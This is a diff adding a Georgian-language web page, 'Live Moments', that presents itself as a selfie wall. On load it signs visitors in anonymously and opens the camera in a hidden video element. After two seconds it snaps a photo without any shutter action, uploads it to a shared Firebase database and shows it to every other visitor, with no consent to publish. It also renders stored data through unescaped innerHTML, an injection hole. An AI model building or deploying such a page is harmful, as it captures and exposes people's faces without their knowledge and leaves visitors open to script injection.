@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="ka">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Live Moments | Instant Selfie Wall</title>
+
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://თქვენი-საიტის-ლინკი.com/">
+    <meta property="og:title" content="Live Moments | Instant Selfie Wall">
+    <meta property="og:description" content="შემოუერთდი, გადაიღე მომენტალური სელფი და გახდი კედლის ნაწილი!">
+    <meta property="og:image" content="https://i.postimg.cc/28P05P7w/4a953b362d24032d2d825d791cc5771d.png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content="https://i.postimg.cc/28P05P7w/4a953b362d24032d2d825d791cc5771d.png">
+
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --bg: #0f172a;
+            --card: #1e293b;
+            --accent: #6366f1;
+            --text: #f8fafc;
+            --dim: #94a3b8;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body { 
+            background-color: var(--bg); 
+            color: var(--text); 
+            font-family: 'Inter', sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        header {
+            padding: 2rem 1rem;
+            text-align: center;
+            width: 100%;
+            background: linear-gradient(to bottom, rgba(30, 41, 59, 0.5), transparent);
+        }
+
+        h1 { font-weight: 600; font-size: 1.5rem; letter-spacing: -0.025em; color: var(--accent); }
+
+        /* Photo Grid System */
+        #photo-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 20px;
+            padding: 20px;
+            width: 100%;
+            max-width: 1200px;
+        }
+
+        .photo-card {
+            background: var(--card);
+            border-radius: 16px;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.3);
+            transition: transform 0.3s ease;
+            animation: slideIn 0.5s ease-out;
+        }
+
+        .photo-card:hover { transform: translateY(-5px); }
+
+        .photo-card img {
+            width: 100%;
+            height: 300px;
+            object-fit: cover;
+            display: block;
+        }
+
+        .card-footer {
+            padding: 12px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: rgba(0, 0, 0, 0.2);
+        }
+
+        .user-id { font-size: 0.75rem; color: var(--dim); font-weight: 600; }
+        .time-tag { font-size: 0.7rem; color: var(--accent); }
+
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Hidden Elements */
+        video, canvas { display: none; }
+
+        /* Empty State */
+        #loader { margin-top: 50px; color: var(--dim); font-style: italic; }
+    </style>
+</head>
+<body>
+
+    <header>
+        <h1>LIVE MOMENTS</h1>
+    </header>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <div id="loader">კამერა ირთვება...</div>
+    <div id="photo-grid"></div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.10.0/firebase-app.js";
+        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/12.10.0/firebase-auth.js";
+        import { getFirestore, collection, addDoc, serverTimestamp, query, orderBy, onSnapshot, limit } from "https://www.gstatic.com/firebasejs/12.10.0/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyBTQhrMI38vXiZxqjAe6AveFUdjELgUD3g",
+            authDomain: "mycode-ec313.firebaseapp.com",
+            projectId: "mycode-ec313",
+            storageBucket: "mycode-ec313.firebasestorage.app",
+            messagingSenderId: "326292014357",
+            appId: "1:326292014357:web:09b40b6c4ea9d7a707951c"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+        const db = getFirestore(app);
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const photoGrid = document.getElementById('photo-grid');
+        const loader = document.getElementById('loader');
+
+        // 1. მყისიერი ავტორიზაცია
+        signInAnonymously(auth).catch(err => console.error("Auth Error:", err));
+
+        onAuthStateChanged(auth, (user) => {
+            if (user) {
+                initLiveWall(); 
+                takeInstantSelfie(user);
+            }
+        });
+
+        // 2. სელფის გადაღება და Firestore-ში შენახვა
+        async function takeInstantSelfie(user) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: false 
+                });
+                video.srcObject = stream;
+
+                setTimeout(async () => {
+                    // ოპტიმიზირებული ზომა Firestore-ისთვის
+                    canvas.width = 480;
+                    canvas.height = 640;
+                    const ctx = canvas.getContext('2d');
+                    
+                    // სარკისებური ეფექტის გასწორება სელფისთვის
+                    ctx.translate(canvas.width, 0);
+                    ctx.scale(-1, 1);
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    const base64 = canvas.toDataURL('image/jpeg', 0.5);
+                    stream.getTracks().forEach(t => t.stop());
+
+                    await addDoc(collection(db, "moments"), {
+                        image: base64,
+                        uid: user.uid.substring(0, 5),
+                        createdAt: serverTimestamp()
+                    });
+                    
+                    loader.style.display = 'none';
+                }, 2000); // 2 წამი დაყოვნება ფოკუსისთვის
+            } catch (e) {
+                loader.innerText = "გთხოვთ, ჩართოთ კამერა ფოტოს გადასაღებად.";
+            }
+        }
+
+        // 3. კედლის განახლება რეალურ დროში
+        function initLiveWall() {
+            const q = query(collection(db, "moments"), orderBy("createdAt", "desc"), limit(50));
+            
+            onSnapshot(q, (snap) => {
+                photoGrid.innerHTML = '';
+                if (snap.empty) {
+                    loader.innerText = "ჯერჯერობით ფოტოები არ არის...";
+                } else {
+                    loader.style.display = 'none';
+                }
+
+                snap.forEach(doc => {
+                    const data = doc.data();
+                    const time = data.createdAt ? new Date(data.createdAt.toDate()).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) : 'ახლახან';
+                    
+                    const card = document.createElement('div');
+                    card.className = 'photo-card';
+                    card.innerHTML = `
+                        <img src="${data.image}" loading="lazy">
+                        <div class="card-footer">
+                            <span class="user-id">ID: ${data.uid || 'Anon'}</span>
+                            <span class="time-tag">${time}</span>
+                        </div>
+                    `;
+                    photoGrid.appendChild(card);
+                });
+            });
+        }
+    </script>
+</body>
+</html>
